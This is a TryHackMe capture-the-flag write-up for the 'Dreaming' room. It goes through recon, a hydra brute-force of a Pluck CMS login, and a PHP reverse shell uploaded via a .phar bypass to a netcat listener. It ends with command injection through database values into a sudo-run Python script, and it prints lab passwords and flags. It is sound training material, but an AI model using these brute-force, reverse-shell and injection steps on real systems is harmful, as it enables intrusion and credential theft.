# THM write-up - [Dreaming](https://tryhackme.com/r/room/dreaming)

A TryHackMe CTF

![intro](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241218143850.png)

## The intro

Difficult level: **Easy**;

Estimated time to complete: **45** could be minutes, could be years;

Let's see what we're working with:

_Solve the riddle that dreams have woven._

Mysterious.. but don't we like riddles, and we do like dreaming?

_While the king of dreams was imprisoned, his home fell into ruins.
Can you help Sandman restore his kingdom?_

Not much at all to be honest, but who needs long introductions? Where is the fun otherwise

Let's go save the kingdom and maybe turn it into a democracy.

## The hunt

Let's start with some good old Reconnaissance with the OG `nmap`

`nmap -p- -T4 <target-ip>`

because no port left behind (`-p-`)

and we don't have time to be stealthy (`-T4`)

![namp](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219104314.png)

Would you look at that, we got ourselves an open http port and an ssh one, let's see what's at that address from our bowsers.

Navigate to `<target-ip>` from firefox: looks like we are dealing with an Apache2 server, let's keep it in mind for the future.

![apache2](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219104744.png)

Meanwhile let's see what else we can find, `gobuster` to the rescue!

`gobuster dir -u <target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r`

append `dir`

to our address `-u <target-ip>`

use the directory list provided `-w <provided-list>`

and follow the redirections `-r`

Looks like we got an `/app` directory, let's see what's there

![folder](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219105402.png)

`pluck-4.7.13` what's that? let's google it!

mmh first results look promising, who doesn't like [Remote Code execution vulnerability](https://www.exploit-db.com/exploits/49909)?

![exploit](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219105634.png)

```
Description:
A file upload restriction bypass vulnerability in Pluck CMS before 4.7.13 allows an admin
privileged user to gain access in the host through the "manage files" functionality,
which may result in remote code execution.
```

Let's go!

Firstly, let's go into the pluck folder:

![homepage](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219105924.png)

Following the exploit instructions let's click on "admin" and land on the login page, this is what we find: a form input for a password, no username, a commented `bogus` input?

![login](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241218161831.png)

let's `hydra` the `fuzz` out of this:

`hydra -l admin -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form "/app/pluck-4.7.13/login.php:cont1=^PASS^&bogus=&submit=Log+in:F=Invalid" -V`

![cracked](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241218162034.png)

password is `password`, I could have guessed that!

Ok we are in, let's follow the exploit: we can go to pages > manage files and upload a shell

![manage files](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219110642.png)

and we see

![upload file](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219110904.png)

let's get our usual php shell from the attack box, or ask AI to create one, whatever is easier:

`cat /usr/share/webshells/php/php-reverse-shell.php > myshell.php.phar`

`nano myshell.php.phar`

then we add our attack box ip and a random port, I like to go for `666` - for no particular reason.

let's also start ourselves an netcat listener at our `666` port

`nc -lvnp 666`

**Note**: if we try to upload a file with just `.php` extension, `.txt` extension is appended, ruining all the fun, that .`phar` let's us bypass that.

Now, let's navigate to the shell, we do so by clicking on the lens:

![uploaded file](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219112116.png)

Aaaand we're in!

![ncat](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219111823.png)

But this shell is lame, let's upgrade it and make our lives a bit easier:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Now more reconnaissance, or, as I like to call it, increasingly desperate search for SOMETHING

`whoami` > `www-data` laaaame

`cat /etc/passwd`

![users](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241218235644.png)

cool so we have lucien, death and morpheus, incidentally the owners of the flags we need to find.

`cat /home/lucien/lucien_flag` > permission denied

and same goes for the other two.

One thing is clear, we need to **ESCALATE PRIVILEDGE**.

Let's keep looking: aimlessly go around the server and look for anything interesting, despair, pray the cybersecurity Gods, curse the cybersecurity gods, talk to the AI, google franticly, ask for a hint, go take a nap.

![5 hours later](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219112959.png)

`ls -la opt`

![opt](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219113103.png)

curious, 2 python scripts we have reading permissions for: let's read `test.py`, ah-ha!

![cat test](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219113454.png)

if it isn't a password for `lucien`!

`HeyLucien#@1999!`

Let's assume lucien's identity immediately! `su lucien`

Go read the damn flag! `cat /home/lucien/lucien_flag.txt`

1. **What is the Lucien Flag?**

_THM{TH3_L1BR4R14N}_

2. **What is the Death Flag?**

Now that we have a password and we know we have an `ssh` port open, let's try and get ourselves a fully functioning terminal, this reverse-shell served us well but it's time to upgrade: from a new terminal tab

`ssh lucien@<target-ip>`

and it worked!

Let' see what we can do as lucien `sudo -l`

```
User lucien may run the following commands on dreaming:
(death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

if we `ls -l` in `death`'s folder we see

![deathls](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219114207.png)

so we can use python to run this getDreams.py script as `death`, but we can't edit it nor read.

`sudo -u death /usr/bin/python3 /home/death/getDreams.py`

![getDreams](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/assets/Pasted%20image%2020241219000931.png)

Nothing interesting here, but I just remembered, wasn't there a python script with the same name in `/opt` that we had reading permissions for? let's go see what is the deal with that.

`cat /opt/getDreams.py`

```
import mysql.connector
import subprocess

# MySQL credentials
DB_USER = "death"
DB_PASS = "#redacted"
DB_NAME = "library"

import mysql.connector
import subprocess

def getDreams():
    try:
        # Connect to the MySQL database
        connection = mysql.connector.connect(
            host="localhost",
            user=DB_USER,
            password=DB_PASS,
            database=DB_NAME
        )

        # Create a cursor object to execute SQL queries
        cursor = connection.cursor()

        # Construct the MySQL query to fetch dreamer and dream columns from dreams table
        query = "SELECT dreamer, dream FROM dreams;"

        # Execute the query
        cursor.execute(query)

        # Fetch all the dreamer and dream information
        dreams_info = cursor.fetchall()

        if not dreams_info:
            print("No dreams found in the database.")
        else:
            # Loop through the results and echo the information using subprocess
            for dream_info in dreams_info:
                dreamer, dream = dream_info
                command = f"echo {dreamer} + {dream}"
                shell = subprocess.check_output(command, text=True, shell=True)
                print(shell)

    except mysql.connector.Error as error:
        # Handle any errors that might occur during the database connection or query execution
        print(f"Error: {error}")

    finally:
        # Close the cursor and connection
        cursor.close()
        connection.close()

# Call the function to echo the dreamer and dream information
getDreams()

```

some script to query a mysql DB, there must be some way to use this, let's ask Claude:

- The sudo permission specifically allows running `/home/death/getDreams.py` as death user
- The script uses subprocess.check_output() with shell=True for echoing dreamer + dream content
- The key vulnerability here is command injection through the database content, since the script directly interpolates database values into a shell command.

Sweet, let's try to access this DB and inject some malicious code. We know the DB name `library` but no password, maybe we can try to access as lucien and use the password we got from earlier?

`mysql -u lucien -pHeyLucien#@1999! library`

nope, that would have been to easy!

let's go back to our lucien folder and see if there is anything there we can leverage

![lslucien](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219143220.png)

looks like we have accessed mysql before, and we have a readable `bash_history` file

`grep mysql .bash_history`

![mysqlgrep](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219143427.png)

noooice, let's try to get into that `library` DB

`mysql -u lucien -plucien42DBPASSWORD library`

and we are in! Let's add some useful stuff for ourselves

`INSERT INTO dreams (dreamer, dream) VALUES ('test', '$(cat /home/death/death_flag.txt)');`

![insert](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219135523.png)

and now let's try again

`sudo /usr/bin/python3 /home/death/getDreams.py`

![secondflag](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219135352.png)

_THM{1M_TH3R3_4_TH3M}_

3. **What is the Morpheus Flag?**

Since we now have found a way to read as death, let's injects another command to the DB, so we can check if we can get that password that was redacted in the `getDreams.py` script

`INSERT INTO dreams (dreamer, dream) VALUES ('test', '$(cat /home/death/getDreams.py)');`

and run again

`sudo /usr/bin/python3 /home/death/getDreams.py`

![deathpw](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219143732.png)

and we got ourselves a password! `!mementoMORI666!`

what are the chances that death's DB password and the ssh password are the same? let's try

`ssh death@<target-ip>`

woop woop we have now assumed death's identity!

I've taken you this far, it's now time for you to go out on your own and find the 3rd and final flag, I know you can do it!
As for me, I think I deserve a little Dreaming of my own
